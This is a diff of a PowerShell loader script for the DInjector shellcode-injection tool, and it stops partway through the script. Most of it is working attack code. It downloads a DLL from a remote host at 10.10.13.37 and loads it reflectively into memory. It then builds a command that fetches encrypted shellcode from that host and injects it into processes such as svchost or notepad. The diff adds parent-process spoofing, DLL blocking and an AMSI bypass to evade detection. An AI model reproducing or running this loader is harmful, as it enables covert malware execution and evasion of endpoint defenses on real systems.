@@ -1,37 +1,56 @@
-# MODULE
-$M = "currentthread"
+# module name
+$A = "currentthread"
 
-# LHOST
-$H = "10.10.13.37"
+# lhost
+$B = "10.10.13.37"
 
-# AMSI
-$A = "true"
+# lport
+$C = 80
 
-# DLL
+# injector filename
 $D = "DInjector.dll"
 
-# SHELLCODE
-$S = "enc"
+# encrypted shellcode filename
+$E = "enc"
 
-# PASSWORD
-$P = "Passw0rd!"
+# password to decrypt the shellcode
+$F = "Passw0rd!"
 
-# PROCESS
-$N = "notepad"
+# path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
+$G = "C:\Windows\System32\svchost.exe"
 
-# IMAGE
-$I = "C:\Windows\System32\svchost.exe"
+# existing process name to inject into (used in "remotethread" and "remotethreadsuspended")
+$H = "notepad"
+
+# parent process name to spoof the original value (use "0" to disable PPID spoofing)
+$I = "explorer"
+
+# block 3rd-party DLLs ("True" / "False")
+$J = "True"
+
+# bypass AMSI ("True" / "False")
+$K = "True"
 
 # --------------------------------------------------------------------
 
 $methods = @("remotethread", "remotethreadsuspended")
-if ($methods.Contains($M)) {
-    $N = (Start-Process -WindowStyle Hidden -PassThru $N).Id
+if ($methods.Contains($A)) {
+    $H = (Start-Process -WindowStyle Hidden -PassThru $H).Id
 }
 
-$cmd = "$M /am51:$A /sc:http://$H/$S /password:$P /pid:$N /image:$I"
+$methods = @("remotethreadapc", "remotethreadcontext", "processhollow")
+if ($methods.Contains($A)) {
+    try {
+        $I = (Get-Process $I -ErrorAction Stop).Id
+    }
+    catch {
+        $I = 0
+    }
+}
 
-$data = (IWR -UseBasicParsing "http://$H/$D").Content
+$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /blockDlls:${J} /am51:${K}"
+
+$data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
 $assem = [System.Reflection.Assembly]::Load($data)
 
 $flags = [Reflection.BindingFlags] "NonPublic,Static"
